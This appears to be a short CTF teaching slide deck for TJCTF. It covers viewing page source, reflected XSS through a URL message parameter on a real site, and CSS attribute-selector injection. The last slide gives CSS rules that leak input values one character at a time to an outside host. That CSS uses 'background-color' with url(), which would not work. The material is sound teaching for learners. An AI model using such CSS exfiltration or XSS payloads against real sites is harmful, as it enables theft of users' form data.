title: Easy Web
---
# Easy Web
Robert Chen

---
# TJCTF
<https://tjctf.org/>

> TJCTF is a Capture the Flag (CTF) competition hosted by TJHSST's Computer Security Club. It is an online, jeopardy-style competition targeted at high schoolers interested in Computer Science and Cybersecurity. Participants may compete on a team of up to 5 people, and will solve problems in categories such as Binary Exploitation, Reverse Engineering, Web Exploitation, Forensics, and Cryptography in order to gain points. The eligible teams with the most points will win prizes at the end of the competition.
---
# Warmup
<https://blurry.tjctf.org/>

~~view source~~
---
# XSS 
<https://www.tabroom.com/index/index.mhtml?msg=custom_message_here>

---
# View Source
```javascript
alertify.notify("custom_message_here", "custom");
```

What happens when we use a "? 

---
# Exploit
???

---
# CSS Injection
<https://moar_horse_3.tjctf.org/>

---
# CSS Attribute Selectors
The `[attribute]` selector is used to select elements with a specified attribute.
```css
input[value^="fla"]{
  background-color: blue;
}
```

---
# How to exploit?
```css
input[value^="a"]{
  background-color: url(http://test.robertchen.cc/a);
}
input[value^="b"]{
  background-color: url(http://test.robertchen.cc/b);
}
```
